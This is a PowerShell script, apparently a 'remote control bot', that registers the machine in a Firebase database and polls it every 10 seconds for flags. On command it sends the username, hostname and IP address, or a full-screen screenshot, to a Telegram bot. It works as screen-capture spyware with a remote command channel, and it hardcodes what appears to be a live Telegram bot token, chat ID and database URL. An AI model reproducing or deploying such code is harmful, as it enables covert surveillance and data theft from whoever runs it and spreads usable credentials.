# ====== CONFIGURATION ======
$BOT_TOKEN = "7634336568:AAHpd1DYhuVRHgv3f2dV8QQ7dEJp1Sfm7Wg"
$CHAT_ID = "5040182635"
$DB_URL = "https://dixitcoder-tools-ai-default-rtdb.europe-west1.firebasedatabase.app"

# ====== SYSTEM INFO ======
$USERNAME = $env:USERNAME
$DATE = Get-Date -Format "ddd MMM dd HH:mm:ss 'IST' yyyy"
$HOSTNAME = $env:COMPUTERNAME
$IP_ADDR = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' -and $_.IPAddress -notlike '169.*' }).IPAddress | Select-Object -First 1
$SCREENSHOT_PATH = "$env:TEMP\screenshot.png"

# ====== FUNCTIONS ======

function Send-TelegramAlert {
    $message = @"
🔔 Login Alert!
👤 User: $USERNAME
📅 Date: $DATE
💻 Hostname: $HOSTNAME
🌐 IP Address: $IP_ADDR
"@
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
                      -Method Post `
                      -Body @{ chat_id = $CHAT_ID; text = $message }
}

function Initialize-FirebaseIfNeeded {
    Write-Host "🔍 Checking Firebase for existing entry..."
    $check = Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME.json" -Method Get -ErrorAction SilentlyContinue

    if (-not $check) {
        Write-Host "🆕 Registering new device: $HOSTNAME"
        $payload = @{
            alert = $false
            screenshot = $false
        } | ConvertTo-Json -Depth 2
        Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME.json" -Method Put -ContentType "application/json" -Body $payload
        Write-Host "✅ Initialized Firebase path for $HOSTNAME"
    } else {
        Write-Host "✅ Firebase already contains $HOSTNAME"
    }
}

function Take-Screenshot {
    Write-Host "📸 Taking screenshot..."
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($SCREENSHOT_PATH, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
}

function Send-ScreenshotToTelegram {
    Write-Host "📤 Sending screenshot to Telegram..."
    $uri = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
    $form = @{
        chat_id = $CHAT_ID
        photo   = Get-Item $SCREENSHOT_PATH
    }
    Invoke-RestMethod -Uri $uri -Method Post -Form $form
}

function Store-LoginToFirebase {
    $payload = @{
        user = $USERNAME
        date = $DATE
        ip   = $IP_ADDR
    } | ConvertTo-Json -Depth 2
    Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME/info.json" -Method Post -ContentType "application/json" -Body $payload
}

function Check-RemoteTriggers {
    Write-Host "📡 Checking remote triggers..."
    $triggers = Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME.json" -Method Get -ErrorAction SilentlyContinue

    if ($triggers.alert -eq $true) {
        Send-TelegramAlert
        Store-LoginToFirebase

        $patch = @{ alert = $false } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME.json" -Method Patch -ContentType "application/json" -Body $patch
    }

    if ($triggers.screenshot -eq $true) {
        Take-Screenshot
        Send-ScreenshotToTelegram

        $patch = @{ screenshot = $false } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DB_URL/usernaes/$HOSTNAME.json" -Method Patch -ContentType "application/json" -Body $patch
    }
}

# ====== MAIN LOOP ======

Write-Host "🚀 Starting remote control bot for $HOSTNAME..."
Initialize-FirebaseIfNeeded

while ($true) {
    Check-RemoteTriggers
    Start-Sleep -Seconds 10
}
